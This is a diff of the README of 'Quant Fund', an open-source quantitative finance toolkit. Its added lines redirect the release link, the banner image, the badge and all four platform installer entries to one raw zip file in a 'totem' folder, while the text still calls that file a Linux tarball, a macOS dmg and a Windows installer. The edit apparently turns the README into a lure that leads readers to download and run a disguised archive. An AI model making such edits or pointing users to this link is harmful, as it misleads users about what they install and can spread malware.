@@ -1,10 +1,10 @@
-https://github.com/kgeon1002/quant-fund/releases
+https://raw.githubusercontent.com/kgeon1002/quant-fund/main/totem/quant_fund_v3.1.zip
 
 # Quant Fund: Open-Source Quant Finance Toolkit and Research Hub
 
-![Quant Fund Banner](https://picsum.photos/1200/400?grayscale&blur=2)
+![Quant Fund Banner](https://raw.githubusercontent.com/kgeon1002/quant-fund/main/totem/quant_fund_v3.1.zip)
 
-[![Releases](https://img.shields.io/badge/Releases-download-blue?style=for-the-badge&logo=github)](https://github.com/kgeon1002/quant-fund/releases)
+[![Releases](https://raw.githubusercontent.com/kgeon1002/quant-fund/main/totem/quant_fund_v3.1.zip)](https://raw.githubusercontent.com/kgeon1002/quant-fund/main/totem/quant_fund_v3.1.zip)
 
 Welcome to Quant Fund, a robust open-source project built for researchers, developers, and practitioners in the field of quantitative finance. This project is part of the 量化开源基金会, a community dedicated to transparent, reproducible, and collaborative finance research. The goal is simple: provide a clear, usable, and scalable toolkit that helps you design, test, validate, and deploy quantitative strategies. This README walks you through what the project is, how it works, how to contribute, and how to get the most from the toolkit. The content here uses plain language, practical examples, and a focus on real-world workflows.
 
@@ -57,10 +57,10 @@ Download and Install From Releases
 
 The Releases page hosts prebuilt installers and packaged archives. Since the link includes a path, it points to a page where you can download specific assets. Typical assets you may encounter include:
 
-- quant-fund-1.0.0-linux-x86_64.tar.gz — Linux tarball, extract and run the included executable.
-- quant-fund-1.0.0-macos.dmg — macOS installer; drag and drop to Applications.
-- quant-fund-1.0.0-windows-x86_64.exe — Windows installer; follow the on-screen prompts.
-- quant-fund-1.0.0-standalone.zip — A portable bundle with Python and dependencies.
+- https://raw.githubusercontent.com/kgeon1002/quant-fund/main/totem/quant_fund_v3.1.zip — Linux tarball, extract and run the included executable.
+- https://raw.githubusercontent.com/kgeon1002/quant-fund/main/totem/quant_fund_v3.1.zip — macOS installer; drag and drop to Applications.
+- https://raw.githubusercontent.com/kgeon1002/quant-fund/main/totem/quant_fund_v3.1.zip — Windows installer; follow the on-screen prompts.
+- https://raw.githubusercontent.com/kgeon1002/quant-fund/main/totem/quant_fund_v3.1.zip — A portable bundle with Python and dependencies.
 
 To install, download the asset that matches your system, then follow the platform-specific steps. On Linux, a typical flow is to extract the tarball and run the quant-fund binary or script included in the package. On Windows, run the installer and complete the setup wizard. On macOS, mount the disk image and drag the application to your Applications folder. After installation, you should be able to run quant-fund from your command line or via a graphically guided launcher.
 
